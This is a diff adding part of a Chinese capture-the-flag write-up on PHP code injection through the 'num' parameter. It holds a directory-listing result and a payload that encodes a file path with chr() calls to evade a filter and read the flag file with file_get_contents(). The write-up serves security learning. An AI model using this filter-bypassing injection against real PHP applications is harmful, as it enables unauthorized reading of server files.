@@ -338,6 +338,20 @@ if(!isset($_GET['num'])){
 
                 scandir() 函数返回指定目录中的文件和目录的数组
 
+```
+Array ( [0] => . [1] => .. [2] => .dockerenv [3] => bin [4] => boot [5] => dev [6] => etc [7] => f1agg [8] => home [9] => lib [10] => lib64 [11] => media [12] => mnt [13] => opt [14] => proc [15] => root [16] => run [17] => sbin [18] => srv [19] => start.sh [20] => sys [21] => tmp [22] => usr [23] => var ) 1
+```
+得到返回的信息。
+这样我们可以发现flag很有可能在“flagg”文件里
+接下来读取文件，用file_get_contents()函数，同时不要忘记要转成用chr()表示的形式：
+```
+? num=print_r(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
+```
+
+                file_get_contents() :把整个文件读入一个字符串中。
+
+得到flag
+
 4.堆叠注入
 -
 
